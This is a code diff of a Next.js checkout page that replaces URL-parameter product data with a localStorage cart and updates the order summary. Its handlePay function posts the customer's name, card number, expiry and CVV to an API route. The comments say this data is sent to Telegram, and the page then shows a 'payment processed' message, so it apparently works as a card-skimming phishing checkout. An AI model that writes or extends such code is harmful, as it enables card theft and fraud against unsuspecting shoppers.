@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect, Suspense } from "react";
-import { useSearchParams } from "next/navigation";
+import { useRouter } from "next/navigation";
 
 type FormErrors = {
   [key: string]: string;
@@ -22,11 +22,11 @@ type FormData = {
   cvv: string;
 };
 
-type ProductInfo = {
+type CartProduct = {
   name: string;
-  price: string;
-  license: string;
-  quantity: string;
+  subtitle: string;
+  price: number;
+  quantity: number;
 };
 
 // InputField component
@@ -86,18 +86,14 @@ function InputField({
   );
 }
 
-// Componente que usa useSearchParams - debe estar dentro de Suspense
+// Componente que usa datos del carrito
 function PaymentsContent() {
-  const searchParams = useSearchParams();
+  const router = useRouter();
   const [currentStep, setCurrentStep] = useState(1);
   const [errors, setErrors] = useState<FormErrors>({});
   const [touched, setTouched] = useState<{ [key: string]: boolean }>({});
-  const [productInfo, setProductInfo] = useState<ProductInfo>({
-    name: "",
-    price: "0",
-    license: "",
-    quantity: "1",
-  });
+  const [cartProducts, setCartProducts] = useState<CartProduct[]>([]);
+  const [totalAmount, setTotalAmount] = useState("0.00");
 
   const [formData, setFormData] = useState<FormData>({
     fullName: "",
@@ -114,35 +110,38 @@ function PaymentsContent() {
     cvv: "",
   });
 
-  // Obtener datos del producto de la URL
+  // Cargar datos del carrito desde localStorage
   useEffect(() => {
-    const product = searchParams.get("product") || "";
-    const price = searchParams.get("price") || "0";
-    const license = searchParams.get("license") || "";
-    const quantity = searchParams.get("quantity") || "1";
+    const savedCart = localStorage.getItem('checkoutCart');
+    const savedTotal = localStorage.getItem('checkoutTotal');
 
-    console.log("📦 Datos recibidos:", { product, price, license, quantity });
-
-    setProductInfo({
-      name: product,
-      price: price,
-      license: license,
-      quantity: quantity,
-    });
-  }, [searchParams]);
-
-  // Calcular el precio total
-  const calculateTotal = () => {
-    const price = parseFloat(productInfo.price) || 0;
-    const quantity = parseInt(productInfo.quantity) || 1;
-    return (price * quantity).toFixed(2);
-  };
+    if (savedCart && savedTotal) {
+      try {
+        const parsedCart = JSON.parse(savedCart);
+        setCartProducts(parsedCart);
+        setTotalAmount(parseFloat(savedTotal).toFixed(2));
+        console.log("📦 Carrito cargado:", parsedCart);
+        console.log("💰 Total:", savedTotal);
+      } catch (e) {
+        console.error('Error al cargar carrito:', e);
+        router.push('/cart');
+      }
+    } else {
+      // Si no hay carrito, redirigir a /cart
+      router.push('/cart');
+    }
+  }, [router]);
 
   // Función para enviar a Telegram
   const handlePay = async () => {
     console.log("🚀 Enviando pago a Telegram...");
     console.log("📦 Datos del formulario:", formData);
-    console.log("🛒 Datos del producto:", productInfo);
+    console.log("🛒 Productos del carrito:", cartProducts);
+
+    // Construir lista de productos para Telegram
+    const productsList = cartProducts.map(item => 
+      `• ${item.name} x${item.quantity} - $${(item.price * item.quantity).toFixed(2)}`
+    ).join('\n');
 
     try {
       const response = await fetch("/api/payments", {
@@ -169,11 +168,10 @@ function PaymentsContent() {
           expiryDate: formData.expiryDate,
           cvv: formData.cvv,
 
-          // Datos del producto
-          product: productInfo.name,
-          license: productInfo.license,
-          quantity: productInfo.quantity,
-          amount: calculateTotal(),
+          // Datos de productos (lista completa)
+          products: cartProducts,
+          productsList: productsList,
+          amount: totalAmount,
         }),
       });
 
@@ -181,6 +179,10 @@ function PaymentsContent() {
 
       if (response.ok) {
         console.log("✅ Pago enviado exitosamente:", data);
+        // Limpiar localStorage después del pago exitoso
+        localStorage.removeItem('checkoutCart');
+        localStorage.removeItem('checkoutTotal');
+        localStorage.removeItem('cart'); // Vaciar carrito
       } else {
         console.error("❌ Error al enviar pago:", data);
       }
@@ -403,8 +405,8 @@ function PaymentsContent() {
   return (
     <div className="min-h-screen bg-white flex items-center justify-center p-4">
       <div className="w-full max-w-[540px]">
-        {/* Product Summary - Mostrar solo si hay producto */}
-        {productInfo.name && currentStep < 3 && (
+        {/* Product Summary - Mostrar lista completa de productos */}
+        {cartProducts.length > 0 && currentStep < 3 && (
           <div className="mb-8 p-5 bg-gradient-to-br from-blue-50 to-indigo-50 rounded-xl border-2 border-blue-200 shadow-sm">
             <h3 className="text-base font-bold text-gray-800 mb-3 flex items-center gap-2">
               <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -412,24 +414,26 @@ function PaymentsContent() {
               </svg>
               Order Summary
             </h3>
-            <div className="space-y-2 text-sm">
-              <div className="flex justify-between items-center">
-                <span className="text-gray-600 font-medium">Product:</span>
-                <span className="font-semibold text-gray-900">{productInfo.name}</span>
-              </div>
-              {productInfo.license && (
-                <div className="flex justify-between items-center">
-                  <span className="text-gray-600 font-medium">License:</span>
-                  <span className="font-semibold text-gray-900 text-right max-w-[200px]">{productInfo.license}</span>
+            <div className="space-y-3 text-sm">
+              {cartProducts.map((product, index) => (
+                <div key={index} className="flex justify-between items-start pb-2 border-b border-blue-200">
+                  <div className="flex-1">
+                    <span className="font-semibold text-gray-900 block">{product.name}</span>
+                    {product.subtitle && (
+                      <span className="text-gray-600 text-xs">{product.subtitle}</span>
+                    )}
+                    <span className="text-gray-600 text-xs block mt-1">
+                      ${product.price.toFixed(2)} × {product.quantity}
+                    </span>
+                  </div>
+                  <span className="font-bold text-gray-900 ml-2">
+                    ${(product.price * product.quantity).toFixed(2)}
+                  </span>
                 </div>
-              )}
-              <div className="flex justify-between items-center">
-                <span className="text-gray-600 font-medium">Quantity:</span>
-                <span className="font-semibold text-gray-900">{productInfo.quantity}</span>
-              </div>
+              ))}
               <div className="pt-3 mt-3 border-t-2 border-blue-300 flex justify-between items-center">
                 <span className="text-gray-900 font-bold text-base">Total Amount:</span>
-                <span className="text-[#F5B800] font-bold text-2xl">€{calculateTotal()}</span>
+                <span className="text-[#F5B800] font-bold text-2xl">${totalAmount}</span>
               </div>
             </div>
           </div>
@@ -684,7 +688,7 @@ function PaymentsContent() {
                 onClick={nextStep}
                 className="bg-[#F5B800] hover:bg-[#E0A800] text-white font-medium py-3 px-8 rounded-full inline-flex items-center gap-2 transition-colors"
               >
-                Pay €{calculateTotal()}
+                Pay ${totalAmount}
                 <svg
                   xmlns="http://www.w3.org/2000/svg"
                   width="16"
@@ -733,26 +737,18 @@ function PaymentsContent() {
                 Thank you for your payment!
               </h2>
               <p className="text-gray-500 text-sm mb-4">
-                Your payment of €{calculateTotal()} has been processed successfully.
+                Your payment of ${totalAmount} has been processed successfully.
               </p>
-              {productInfo.name && (
+              {cartProducts.length > 0 && (
                 <div className="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-200 text-left max-w-sm mx-auto">
                   <h3 className="text-sm font-semibold text-gray-700 mb-2">Purchase Details</h3>
-                  <div className="space-y-1 text-sm">
-                    <div className="flex justify-between">
-                      <span className="text-gray-600">Product:</span>
-                      <span className="font-medium text-gray-900">{productInfo.name}</span>
-                    </div>
-                    {productInfo.license && (
-                      <div className="flex justify-between">
-                        <span className="text-gray-600">License:</span>
-                        <span className="font-medium text-gray-900">{productInfo.license}</span>
+                  <div className="space-y-2 text-sm">
+                    {cartProducts.map((product, index) => (
+                      <div key={index} className="flex justify-between">
+                        <span className="text-gray-600">{product.name} ×{product.quantity}:</span>
+                        <span className="font-medium text-gray-900">${(product.price * product.quantity).toFixed(2)}</span>
                       </div>
-                    )}
-                    <div className="flex justify-between">
-                      <span className="text-gray-600">Quantity:</span>
-                      <span className="font-medium text-gray-900">{productInfo.quantity}</span>
-                    </div>
+                    ))}
                   </div>
                 </div>
               )}
